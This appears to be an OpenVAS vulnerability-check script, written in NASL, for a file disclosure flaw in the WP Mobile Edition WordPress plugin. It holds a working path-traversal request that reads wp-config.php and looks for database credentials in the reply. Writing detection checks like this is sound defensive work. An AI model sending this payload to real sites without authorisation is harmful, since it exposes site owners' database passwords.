###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_wp_mobile_edition_remote_file_disc_vuln.nasl 6513 2017-07-04 09:59:28Z teissa $
#
# Wordpress WP Mobile Edition Plugin Remote File Disclosure Vulnerability
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805531");
  script_version("$Revision: 6513 $");
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2017-07-04 11:59:28 +0200 (Tue, 04 Jul 2017) $");
  script_tag(name:"creation_date", value:"2015-04-14 18:42:20 +0530 (Tue, 14 Apr 2015)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_name("Wordpress WP Mobile Edition Plugin Remote File Disclosure Vulnerability");

  script_tag(name: "summary" , value:"The host is installed with Wordpress
  WP Mobile Edition Plugin and is prone to file disclosure vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET
  request and check whether it is able to read the file data or not.");

  script_tag(name:"insight", value:"Flaw is due to the plugin not filtering data
  in GET parameter 'files' in file 'themes/mTheme-Unus/css/css.php' script.");

  script_tag(name:"impact", value:"Successful exploitation will allow an
  unauthenticated remote attacker to gain access to sensitive file
  information.

  Impact Level: Application");

  script_tag(name: "affected" , value:"Wordpress WP Mobile Edition Plugin
  version 2.2.7");

  script_tag(name:"solution", value:"Upgrade to Wordpress WP Mobile Edition Plugin
  version 2.3 or later. 
  For upgrades refer to https://wordpress.org/plugins/wp-mobile-edition");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/36733");
  script_xref(name : "URL" , value : "https://wordpress.org/plugins/wp-mobile-edition/changelog");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Variable Initialization
http_port = 0;
wpReq = "";
wpRes = "";
dir = "";
url = "";


## Get HTTP Port
if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

## Get WordPress Location
if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

## Construct the attack request
url = dir +  "/wp-content/themes/mTheme-Unus/css/css.php?files=" +
             "../../../../wp-config.php";

# Try attack and check the response to confirm vulnerability
## Extra check and Plugin Confirmation is not possible
if(http_vuln_check(port:http_port, url:url, check_header:FALSE,
  pattern:"<\?php", extra_check:make_list("DB_NAME", "USER", "DB_PASSWORD")))
{
  report = report_vuln_url( port:http_port, url:url );
  security_message(port:http_port, data:report);
  exit(0);
}
